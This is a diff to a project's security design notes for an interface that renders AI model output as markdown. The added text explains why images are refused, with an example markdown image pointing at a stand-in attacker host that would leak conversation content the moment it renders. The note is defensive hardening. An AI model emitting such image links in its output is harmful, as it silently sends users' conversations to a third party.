@@ -59,7 +59,10 @@ Properties worth knowing before changing anything here:
   `input`) and never requests encrypted reasoning; Anthropic `thinking_delta` / `signature_delta`
   are dropped before anything can read them.
 - **Model output is untrusted input.** It reaches the DOM only through `react-markdown` with GFM
-  — no `rehype-raw`, no `dangerouslySetInnerHTML`, and a link-scheme allowlist.
+  — no `rehype-raw`, no `dangerouslySetInnerHTML`, and a link-scheme allowlist. **No image is
+  ever loaded**: an `href` is inert until someone clicks it, but a `src` is fetched the moment it
+  renders, so `![](https://attacker.example/?d=…)` would exfiltrate conversation content with no
+  click at all. `src` is refused for every scheme and `img` renders inert text.
 
 ### What the Interaction Receipt may and may not say
 
